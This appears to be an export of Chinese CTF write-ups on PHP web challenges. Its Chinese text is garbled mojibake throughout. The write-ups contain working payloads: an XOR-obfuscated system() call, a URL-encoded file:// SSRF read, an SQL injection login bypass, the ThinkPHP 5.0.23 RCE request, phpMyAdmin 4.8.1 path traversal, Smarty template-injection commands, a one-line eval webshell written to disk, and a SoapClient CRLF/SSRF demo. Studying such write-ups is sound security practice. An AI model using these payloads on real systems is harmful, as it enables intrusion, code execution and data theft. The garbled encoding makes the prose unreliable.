å†ç”¨ä¸‹é¢çš„è„šæœ¬æ‰¾åˆ°èƒ½å¼‚æˆ–å‡º_GETçš„å­—ç¬¦ï¼š 12345678910111213141516171819202122a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,]#aæ˜¯ä¸Šé¢çš„phpè„šæœ¬å‡ºæ¥çš„æ•°æ®ï¼Œé€šè¿‡preg_matchçš„å­—ç¬¦_=[]G=[]E=[]T=[]for i in a[27:]:#æˆªå–aåˆ—è¡¨27åé¢çš„æ•°æ®ï¼Œç›®çš„æ˜¯é¿å¼€å¯è§†å­—ç¬¦ã€‚æˆ‘ä»¬éœ€è¦ä¸å¯è§†å­—ç¬¦æ¥å¼‚æˆ– for j in a[27:]: tem=(i^j) if(chr(tem)==&quot;_&quot;): _.append((str(hex(i)[2:])) + &quot;*&quot; + str(hex(j)[2:])) if(chr(tem)==&quot;G&quot;): G.append((str(hex(i)[2:])) + &quot;*&quot; + str(hex(j)[2:])) if (chr(tem) == &quot;E&quot;): temp = [] E.append((str(hex(i)[2:])) + &quot;*&quot; + str(hex(j)[2:])) if (chr(tem)== &quot;T&quot;): T.append((str(hex(i)[2:])) + &quot;*&quot; + str(hex(j)[2:]))print(_)print(G)print(E)print(T) æœ‰å¾ˆå¤šï¼Œç”¨ç¬¬ä¸€ä¸ªæ¥å¯¹åŸé¢˜è¯•ä¸€è¯•ï¼š 1?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%87&#125;)&amp;%86&#x3D;system&amp;%87&#x3D;cat%20flag.php åè®° CTFhubä¸Šé¢ç°åœ¨æœ‰è¿™é“é¢˜çš„å¤ç°ç¯å¢ƒï¼Œä½†æ˜¯æˆ‘å‘ç°ç”¨y1ngå¸ˆå‚…å’Œgmlå¸ˆå‚…çš„payloadéƒ½ä¼šä¸è¡Œï¼Œç”¨æˆ‘è¿™ä¸ªå¼‚æˆ–æ–¹å¼çš„payloadå¯ä»¥æ­£å¸¸å›æ˜¾ã€‚ do you know [solved] è€ƒç‚¹ ä»£ç å®¡è®¡ SSRF + XXE è§£é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phphighlight_file(__FILE__);#æœ¬é¢˜æ— æ³•è®¿é—®å¤–ç½‘#è¿™é¢˜çœŸæ²¡æœ‰å…¶ä»–æ–‡ä»¶ï¼Œè¯·ä¸è¦å†å¼€ç›®å½•æ‰«æå™¨äº†ï¼Œæœ‰çš„æ–‡ä»¶æˆ‘éƒ½åœ¨æ³¨é‡Šé‡Œé¢å‘Šè¯‰ä½ ä»¬äº†#å„ä½å¤§ä½¬...è¿™é¢˜éƒ½æ²¡æœ‰æ•°æ®åº“çš„å­˜åœ¨...éº»çƒ¦ä¸è¦ç”¨å·¥å…·æ‰«æˆ‘äº†å¥½ä¸å¥½#there is xxe.php$poc=$_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&quot;/log|flag|hist|dict|etc|file|write/i&quot; ,$poc))&#123; die(&quot;no hacker&quot;); &#125;$ids=explode(&#x27;&amp;&#x27;,$poc);$a_key=explode(&#x27;=&#x27;,$ids[0])[0];$b_key=explode(&#x27;=&#x27;,$ids[1])[0];$a_value=explode(&#x27;=&#x27;,$ids[0])[1];$b_value=explode(&#x27;=&#x27;,$ids[1])[1];if(!$a_key||!$b_key||!$a_value||!$b_value)&#123; die(&#x27;æˆ‘ä»€ä¹ˆéƒ½æ²¡æœ‰~&#x27;);&#125;if($a_key==$b_key)&#123; die(&quot;trick&quot;);&#125;if($a_value!==$b_value)&#123; if(count($_GET)!=1) &#123; die(&#x27;be it so&#x27;); &#125;&#125;foreach($_GET as $key=&gt;$value)&#123; $url=$value;&#125;$ch = curl_init(); if ($type != &#x27;file&#x27;) &#123; #add_debug_log($param, &#x27;post_data&#x27;); // è®¾ç½®è¶…æ—¶ curl_setopt($ch, CURLOPT_TIMEOUT, 30); &#125; else &#123; // è®¾ç½®è¶…æ—¶ curl_setopt($ch, CURLOPT_TIMEOUT, 180); &#125; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // è®¾ç½®header if ($type == &#x27;file&#x27;) &#123; $header[] = &quot;content-type: multipart/form-data; charset=UTF-8&quot;; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); &#125; elseif ($type == &#x27;xml&#x27;) &#123; curl_setopt($ch, CURLOPT_HEADER, false); &#125; elseif ($has_json) &#123; $header[] = &quot;content-type: application/json; charset=UTF-8&quot;; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); &#125; // curl_setopt($ch, CURLOPT_USERAGENT, &#x27;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_AUTOREFERER, 1); // dump($param); curl_setopt($ch, CURLOPT_POSTFIELDS, $param); // è¦æ±‚ç»“æœä¸ºå­—ç¬¦ä¸²ä¸”è¾“å‡ºåˆ°å±å¹•ä¸Š curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // ä½¿ç”¨è¯ä¹¦ï¼šcert ä¸ key åˆ†åˆ«å±äºä¸¤ä¸ª.pemæ–‡ä»¶ $res = curl_exec($ch); var_dump($res); é¢„æœŸè§£ æ€è·¯ï¼šç”¨gopherè¿›è¡Œssrfå‘é€postè¯·æ±‚ç»™xxe.php å…ˆç•™ä¸€ä¸ªå‘ä½ï¼Œç­‰ä¸€æ‰‹å¤ç°ç¯å¢ƒï¼šhttps://blog.csdn.net/a3320315/article/details/106960331 éé¢„æœŸè§£ è¿™é‡Œåˆ©ç”¨äº†$_SERVER['QUERY_STRING'];ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œä½†æ˜¯åé¢èµ‹å€¼æ˜¯$_GETèµ‹çš„å€¼ï¼Œä¿å­˜çš„æ˜¯è§£ç åçš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´wafæ£€æµ‹çš„æ˜¯urlè§£ç å‰çš„valueï¼Œç›´æ¥å°† file:///var/www/html/flag.php è¿›è¡Œurlç¼–ç ï¼Œå¯ä»¥æ‹¿åˆ°flagã€‚ payloadï¼š 1http:&#x2F;&#x2F;121.36.64.91&#x2F;?a&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;b&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70 Laravel [unsolved] æºç ä¸‹è½½ï¼š é“¾æ¥ï¼šhttps://pan.baidu.com/s/1WEWSkDzyE5MXSh9CXQ-q3A æå–ç ï¼šp88e è€ƒç‚¹ PHPååºåˆ—åŒ– POPé“¾ è§£é¢˜ å…ˆç•™ä¸€ä¸ªå‘ï¼Œå…ˆæŠŠPHPçš„ä¾èµ–æ³¨å…¥çš„çŸ¥è¯†å­¦å®Œï¼Œä¸ç„¶çœ‹æºç æœ‰ç‚¹åƒåŠ›ã€‚ ç¾å›¢å¤–å– [unsolved] æºç ä¸‹è½½ï¼š é“¾æ¥ï¼šhttps://pan.baidu.com/s/1sjERSDUUOf0O63BLqW1hZw æå–ç ï¼š359o è€ƒç‚¹ SQLæ³¨å…¥ ä»£ç å®¡è®¡ è§£é¢˜ æš‚æ—¶è¿˜æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œåªèƒ½äº‘åšé¢˜äº†ï¼Œå‚è€ƒï¼š https://www.gem-love.com/ctf/2380.html http://igml.top/2020/06/25/2020-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›åˆèµ›wp/ æ‰«å‡ºæ¥www.zipæºç  é¦–å…ˆæ˜¯ä¸ªç™»å½•æ¡†ï¼Œçœ‹æºç å°±å¾ˆåƒGXYCTF2019 EasySQLiv1.0é‚£é“é¢˜çš„md5ç»•è¿‡ã€‚ 12ç”¨æˆ·å : &#39; union select &quot;0f5ed8a8d8d44d86a570aacffa922251&quot;#å¯†ç  : ca01h å¯ä»¥ç™»å½•ï¼Œä½†æ˜¯sessioné‡Œé¢çš„userä¸æ˜¯adminã€‚ç»§ç»­å®¡è®¡åˆ°daochu.phpï¼ŒSQLæ³¨å…¥æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œè¿˜æœ‰å›æ˜¾ï¼š å¸¸è§„çš„SQLè”åˆæ³¨å…¥ï¼š æœ‰ä¸ªhintè¡¨ï¼Œæ¥ç€è¯»åˆ—åæ˜¯hintsã€‚å†dumpæ•°æ®ï¼š ç›´æ¥è®¿é—®è¿™ä¸ªç›®å½•ï¼Œå’Œä¸»é¡µä¸€æ ·çš„ç•Œé¢ï¼Œç„¶è€Œè¿™é‡Œé¢æ²¡æœ‰www.zipäº†ï¼Œæ¥ä¸‹æ¥ç«Ÿç„¶è¦å»libæ–‡ä»¶å¤¹é‡Œé¢å»å®¡è®¡ã€‚ã€‚ã€‚ğŸ˜“ å¯ä»¥ç›´æ¥ç”¨findå‘½ä»¤æ‰¾ä¸€ä¸‹PHPç±»å‹çš„æ–‡ä»¶ï¼Œå¹¶ä¸”æŸ¥çœ‹æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶ï¼Œæœ€åå®šä½åˆ°lib/webuploader/0.1.5/server/preview.phpï¼Œå…³é”®ä»£ç ï¼š æ„é€ ä¸€ä¸ªç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„POSTæ•°æ®ï¼š 1data:image&#x2F;test;base64,test é¢˜ç›®è¿”å›äº†ä¸€ä¸ªç¥ç§˜æ–‡ä»¶ï¼Œè®¿é—®ä¹‹åæç¤ºget fileï¼Œæ‰€ä»¥å°±ç›´æ¥è¯»flagå°±å¯ä»¥äº†ã€‚ è¿˜æœ‰ä¸€ç§è§£æ³•æ˜¯webuploader 0.1.5çš„å…¬å¼€æ¼æ´ï¼š https://9finger.cn/2020/03/06/CNVD-2018-26054æ¼æ´å¤ç°/#æ¼æ´åˆ†æ","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”PHPæ¡†æ¶æ¼æ´ç¯‡","date":"2020-06-27T02:57:08.000Z","path":"Web_security/ctf_writeup/5.buuctfåˆ·é¢˜â€”â€”PHPæ¡†æ¶æ¼æ´ç¯‡/","text":"BUUCTFâ€”â€”PHPæ¡†æ¶æ¼æ´ç¯‡ BJDCTF 2nd old-hacker è€ƒç‚¹ ThinkPHP 5.0.23 RCE è§£é¢˜ payloadï¼š 12index.php?s&#x3D;captchaPOST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag BJDCTF2020 The mystery of ip è€ƒç‚¹ PHP Smarty æ¨¡æ¿æ³¨å…¥ è§£é¢˜ payloadï¼š 1X-Forward-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125; GKCTF2020 CVEç‰ˆç­¾åˆ° è€ƒç‚¹ cve-2020-7066 è§£é¢˜ é¦–å…ˆGoogleä¸€ä¸‹cve-2020-7066 åœ¨ä½äº7.2.29çš„PHPç‰ˆæœ¬7.2.xï¼Œä½äº7.3.16çš„7.3.xå’Œä½äº7.4.4çš„7.4.xä¸­ï¼Œå°†get_headersï¼ˆï¼‰ä¸ç”¨æˆ·æä¾›çš„URLä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¦‚æœURLåŒ…å«é›¶ï¼ˆ\\0ï¼‰å­—ç¬¦ï¼Œåˆ™URLå°†è¢«é™é»˜åœ°æˆªæ–­ã€‚ demoï¼š 12345678910&lt;?php// user input$_GET[&#x27;url&#x27;] = &quot;http://localhost\\0.example.com&quot;;$host = parse_url($_GET[&#x27;url&#x27;], PHP_URL_HOST);if (substr($host, -12) !== &#x27;.example.com&#x27;) &#123; die();&#125;$headers = get_headers($_GET[&#x27;url&#x27;]);var_dump($headers); åœ¨PHP7.1ç‰ˆæœ¬ä¸‹ä¼šè¾“å‡ºNullï¼Œåœ¨PHP7.2ç‰ˆæœ¬ä¸‹ä¼šè¾“å‡ºhttp://localhost è®¿é—®é¦–é¡µæŸ¥çœ‹network ç»“åˆcve-2020-7066ï¼Œç”¨http://127.0.0.123%00www.ctfhub.comå³å¯è·å¾—flagã€‚ localhostä¸æ˜¯å•æŒ‡127.0.0.1ï¼Œè€Œæ˜¯ç¬¦åˆ127.0.0.0/24è¿™ä¸€ç½‘æ®µçš„IPåœ°å€ï¼Œæ¯”å¦‚127.0.0.100ä¹Ÿå¯ä»¥å«localhost GYCTF2019 æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“ è€ƒç‚¹ phpmyadmin 4.8.1 ä»»æ„æ–‡ä»¶è¯»å– è§£é¢˜ æ‰“å¼€é¢˜ç›®æç¤ºæœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œè®¿é—®robots.txtï¼Œå‘ç°phpinfo.phpé¡µé¢ï¼Œè¿‡ä¸€éä¹‹åæ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚ï¼ˆæˆ‘éƒ½ä¸çŸ¥é“ä¸ºå•¥è¦ç»™è¿™ä¸ªæ–‡ä»¶ï¼Œåè€ŒæŠŠæˆ‘ç»™å¸¦åäº†ã€‚ï¼‰ æ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ‰«å‡ºæ¥äº†phpmyadminè·¯å¾„ï¼Œè®¿é—®åæ²¡æœ‰å¯†ç ç›´æ¥è¿›å…¥æ•°æ®åº“ç®¡ç†é¡µé¢ï¼Œé™¤äº†MySQLè‡ªå¸¦çš„ä¸¤ä¸ªæ•°æ®åº“ï¼Œç¡®å®æ²¡æœ‰å…¶ä»–çš„æ•°æ®åº“ï¼ŒæŸ¥çœ‹å½“å‰phpmyadminç‰ˆæœ¬æ˜¯4.8.1ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰ä¸€ä¸ªCVE-2018-12613çš„å…¬å¼€æ¼æ´ï¼Œå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ã€‚é‚£å°±ç›´æ¥ä¸Špayloadï¼š 1index.php&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag åè®° çŸ¥å…¶ç„¶æ›´è¦çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œæ¥å¤ç°ä¸€ä¸‹phpmyadmin 4.8.1ã€‚ é—®é¢˜å°±å‡ºåœ¨ç¬¬61è¡Œçš„includeå‡½æ•° å‰ææ˜¯ç»•è¿‡55-59è¡Œçš„æ£€æŸ¥ã€‚ ç¬¬55è¡Œå’Œç¬¬56è¡Œéƒ½æ¯”è¾ƒå®¹æ˜“passï¼Œç¬¬57è¡Œé™åˆ¶targetå‚æ•°ä¸èƒ½ä»¥indexå¼€å¤´ï¼Œç¬¬58è¡Œé™åˆ¶targetå‚æ•°ä¸èƒ½æœ‰$target_blacklistæ•°ç»„ä¸­çš„å…³é”®å­—ï¼Œå…¶ä¸­$target_blackliståŒ…æ‹¬import.phpå’Œexport.phpï¼Œç¬¬59è¡Œå°†targetå‚æ•°ä¼ å…¥checkPageValidityè¿›è¡Œæ£€æŸ¥ï¼Œæ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334public static function checkPageValidity(&amp;$page, array $whitelist = []) &#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false; &#125; è¦æƒ³ä½¿è¯¥å‡½æ•°è¿”å›trueï¼ŒåŒ…å«çš„æ–‡ä»¶å¿…é¡»åŒ…å«åœ¨ç™½åå•$goto_whitelistä¸­ï¼Œ ç¬¬14è¡Œåˆ°21è¡Œçš„ä»£ç æ˜¯ä»¥?åˆ†å‰²ç„¶åå–å‡ºå‰é¢çš„å­—ç¬¦ä¸²å†åˆ¤æ–­å€¼æ˜¯å¦å­˜åœ¨ä¸$goto_whilelistæŸä¸ªæ•°ç»„ä¸­ã€‚ ç¬¬23è¡Œåˆ°ç¬¬31è¡Œä»£ç æ˜¯å°†$pageå‚æ•°ç”¨urlencodeè§£ç å†è¿›è¡Œä»¥?åˆ†å‰²å–å‡ºå‰é¢çš„å€¼åšåˆ¤æ–­ã€‚ æˆ‘æŠŠ?ä¸¤æ¬¡urlç¼–ç ä¸º %253f å³å¯ç»•è¿‡éªŒè¯ã€‚ é‚£ä¹ˆä¼ å…¥target=db_sql.php%253f/../../etc/passwdï¼Œå…¶ä¸­%253fæ˜¯?å·çš„äºŒæ­¤urlç¼–ç urlcodeå°†$pageè§£ç åæ˜¯db_sql.php?/../../etc/passwd ï¼Œå†ä»¥?åˆ†å‰²å–å‡ºæ¥å‰é¢çš„å­—ç¬¦ä¸²ä¸ºdb_sql.phpï¼Œâ€‹$goto_whitelistä¸­æœ‰db_sql.phpæ‰€ä»¥ä¼šè¿›å…¥æœ€åä¸€ä¸ªifè¯­å¥å¹¶è¿”å›trueã€‚ åˆ©ç”¨æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸‹SELECT '&lt;?=phpinfo()?&gt;';ï¼Œç„¶åæŸ¥çœ‹è‡ªå·±çš„sessionidï¼ˆcookieä¸­phpMyAdminçš„å€¼ï¼‰ï¼Œç„¶ååŒ…å«sessionæ–‡ä»¶å³å¯ï¼š CISCN2019 åä¸œå—èµ›åŒº Web11 è€ƒç‚¹ smarty SSTI è§£é¢˜ å‚è€ƒæ–‡ç«  é¡µé¢æç¤ºä¸¤ä¸ªAPIå¹¶ä¸èƒ½ç”¨ï¼Œä½†æ˜¯åœ¨å³ä¸Šè§’è¿˜æ˜¯çœ‹åˆ°äº†ä¸€ä¸ªCurrent IPçš„æ˜¾ç¤ºï¼Œè€Œä¸”é¡µè„šè¿˜è¯´æ˜äº†è¿™ä¸ªç«™ç‚¹ç”¨åˆ°äº†Smartyæ¨¡æ¿å¼•æ“ï¼Œé‚£ä¹ˆSSTIçš„æ³¨å…¥ç‚¹åº”è¯¥å°±æ˜¯åœ¨X-Forward-Forè¯·æ±‚å¤´ã€‚ ç”¨&#123;&#123;7*'7'&#125;&#125;æµ‹è¯•ä¸€ä¸‹ ç”¨ç½‘ä¸Šå¸¸è§çš„Smarty SSTIè¯»æ–‡ä»¶çš„payloadï¼š 1&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125; ç›´æ¥æŠ¥é”™ã€‚ Smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„if éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚*||*,or,&amp;&amp;,and,is_array(), ç­‰ç­‰ã€‚ æŒ‰ç…§ifçš„è¿™ä¸ªç‰¹æ€§ï¼Œå°è¯•æ‰§è¡Œphpinfo()ï¼ŒæˆåŠŸæ‰§è¡Œã€‚ ä½¿ç”¨systemå‡½æ•°å¯ä»¥æ‰§è¡Œlså‘½ä»¤ï¼Œä½†æ˜¯ä¸èƒ½æ‰§è¡Œè¯»æ–‡ä»¶çš„æ“ä½œã€‚é‚£å°±ç›´æ¥ç”¨show_sourceå‡½æ•° æ‹“å±• ä¸åŒç‰ˆæœ¬å¯ä»¥åˆ©ç”¨çš„æ–¹å¼ä¸åŒï¼Œå¸¸ç”¨çš„æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼š 1.æ—§ç‰ˆSmartyæ”¯æŒä½¿ç”¨{php}{/php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ã€‚ Smarty3çš„å®˜æ–¹æ‰‹å†Œæè¿°ï¼š 1Smartyå·²ç»åºŸå¼ƒ&#123;php&#125;æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ&#123;php&#125;ä»…åœ¨SmartyBCä¸­å¯ç”¨ 2.æ—§ç‰ˆSmartyå¯ä»¥é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™ 3.PHPå‡½æ•°éƒ½å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ï¼Œå› æ­¤æ³¨å…¥æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š 1&#123;system(&#39;ls&#39;)&#125; ä¾¿å¯éšæ„æ‰§è¡Œå‘½ä»¤ï¼›æ‰§è¡Œå¤šæ¡è¯­å¥çš„è¯å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å½¢å¼ï¼š 1&#123;system(&#39;ls&#39;)&#125;&#123;system(&#39;cat index.php&#39;)&#125; -----------------åˆ†å‰²çº¿ æ”»é˜²ä¸–ç•Œä¸Šæœ‰ä¸€é“å‡çº§ç‰ˆçš„ï¼Œé™åˆ¶disable_functionä»¥åŠopen_basedirã€‚ ä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç›´æ¥å†™shellï¼Œç”¨èšå‰‘è¿æ¥ç›´æ¥ç»•è¿‡ã€‚ 1&#123;file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;,&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;)&#125; GYCTF2020 Easy Thinking è€ƒç‚¹ ThinkPHP 6.0.0~6.0.2 ä»»æ„æ–‡ä»¶ä¸Šä¼  è§£é¢˜ éšä¾¿æµ‹è¯•å‘ç°ç”¨çš„æ¡†æ¶æ˜¯ThinkPHP6.0ï¼ŒGoogleä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°1æœˆä»½çˆ†å‡ºçš„ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ã€‚ https://paper.seebug.org/1114 æ‰«æä¹‹åæœ‰æºç æ³„éœ²www.zipï¼Œä¸‹è½½ä¹‹åå®¡è®¡ä¸€ä¸‹ 123456789101112131415161718192021222324252627282930public function search() &#123; if (Request::isPost())&#123; if (!session(&#x27;?UID&#x27;)) &#123; return redirect(&#x27;/home/member/login&#x27;); &#125; $data = input(&quot;post.&quot;); $record = session(&quot;Record&quot;); if (!session(&quot;Record&quot;)) &#123; session(&quot;Record&quot;,$data[&quot;key&quot;]); &#125; else &#123; $recordArr = explode(&quot;,&quot;,$record); $recordLen = sizeof($recordArr); if ($recordLen &gt;= 3)&#123; array_shift($recordArr); session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]); return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]); &#125; &#125; session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]); return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]); &#125;else&#123; return View(&quot;search&quot;); &#125; &#125; å‘ç° searchæœç´¢çš„åœ°æ–¹æœ‰ä¸€ä¸ª session çš„å‚¨å­˜ã€‚ å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å½•ï¼Œç„¶åæœç´¢çš„æ—¶å€™æŠ“åŒ…ã€‚ thinkphp6 ä¼šé»˜è®¤åœ¨ /runtime/session åˆ›å»ºä¸€ä¸ªsess_xxxæ ¼å¼çš„sessionæ–‡ä»¶ï¼Œè¿™é‡Œçš„xxxå°±æ˜¯PHPSESSIDï¼ˆå¿…é¡»æ˜¯32ä½ï¼‰ï¼Œè€Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionçš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯keyçš„å†…å®¹ã€‚ ç„¶åæœç´¢çš„æ—¶å€™å†™å…¥shell å†ç”¨èšå‰‘è¿æ¥ï¼Œç”¨æ’ä»¶ç»•è¿‡disable_functionã€‚","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"http://ca0y1h.top/tags/PHP/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"æ¡†æ¶æ¼æ´","slug":"CTF/æ¡†æ¶æ¼æ´","permalink":"http://ca0y1h.top/categories/CTF/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"}]},{"title":"PHPååºåˆ—åŒ–å­¦ä¹ -å­—ç¬¦é€ƒé€¸","date":"2020-06-23T13:34:59.000Z","path":"Web_security/php_related/6.PHPååºåˆ—åŒ–å­¦ä¹ -å­—ç¬¦é€ƒé€¸/","text":"ä»ä¸€é“CTFé¢˜å­¦ä¹ PHPååºåˆ—åŒ–çš„å¯¹è±¡/å­—ç¬¦é€ƒé€¸","tags":[],"categories":[]},{"title":"PHPååºåˆ—åŒ–å­¦ä¹ â€”â€”åŸç”Ÿç±»åˆ©ç”¨","date":"2020-06-23T08:01:53.000Z","path":"Web_security/php_related/5.PHPååºåˆ—åŒ–å­¦ä¹ -åŸç”Ÿç±»åˆ©ç”¨/","text":"ä»ä¸¤é“CTFé¢˜ç›®å­¦ä¹ PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨ æ–‡ç« å›´ç»•ç€ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•åœ¨åŸæœ¬çš„ä»£ç ä¸­æ‰¾ä¸åˆ°popé“¾çš„æ—¶å€™ï¼Œé€šè¿‡åŸç”Ÿç±»æ„é€ ååºåˆ—åŒ–æ¼æ´ï¼Ÿ ä¸»è¦æ˜¯ä¸¤ä¸ªåŸç”Ÿç±»ï¼š SoapClient Errorï¼ˆPHP7ï¼‰æˆ–Exceptionï¼ˆPHP5å’Œ7ï¼‰ SoapClient + CLRF +SSRF é¢˜ç›®ï¼š2018LCTF Bestphpâ€™s revenge SoapClientç±» ç”¨æ¥æä¾›å’Œä½¿ç”¨ webserviceã€‚ 1public SoapClient::SoapClient(mixed $wsdl[,array$options]) ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºWSDL æ–‡ä»¶çš„ URI ï¼Œå¦‚æœæ˜¯NULL æ„å‘³ç€ä¸ä½¿ç”¨ WSDL æ¨¡å¼ã€‚ ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨WSDL æ¨¡å¼ä¸‹ï¼Œè¿™ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ã€‚å¦‚æœåœ¨non-WSDL æ¨¡å¼ä¸‹ï¼Œå¿…é¡»è®¾ç½®location å’Œ uri å‚æ•°ï¼Œlocationæ˜¯è¦è¯·æ±‚çš„ URLï¼Œuriæ˜¯è¦è®¿é—®çš„èµ„æºã€‚ åœ¨å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå®ƒçš„user_agent å‚æ•°æ˜¯å¯ä»¥æ§åˆ¶ HTTPå¤´éƒ¨çš„ User-Agent çš„ã€‚è€Œåœ¨HTTP åè®®ä¸­ï¼Œheader ä¸body æ˜¯ç”¨ä¸¤ä¸ª \\r\\nåˆ†éš”çš„ï¼Œæµè§ˆå™¨ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸¤ä¸ª \\r\\næ¥åŒºåˆ† header å’Œbody çš„ã€‚ The user_agent option specifies string to use in User-Agent header. demoï¼š 123456&lt;?php$a= array(&#x27;location&#x27;=&gt;&#x27;http://127.0.0.1:20000/&#x27;,&#x27;uri&#x27;=&gt;&#x27;user&#x27;);$x= newSoapClient(NULL,$a);$y= serialize($x);$z= unserialize($y);$z-&gt;no_func(); ç›‘å¬æœ¬åœ°çš„20000ç«¯å£ï¼š 12345678910POST &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1:20000Connection: Keep-AliveUser-Agent: PHP-SOAP&#x2F;5.5.9-1ubuntu4.29Content-Type: text&#x2F;xml; 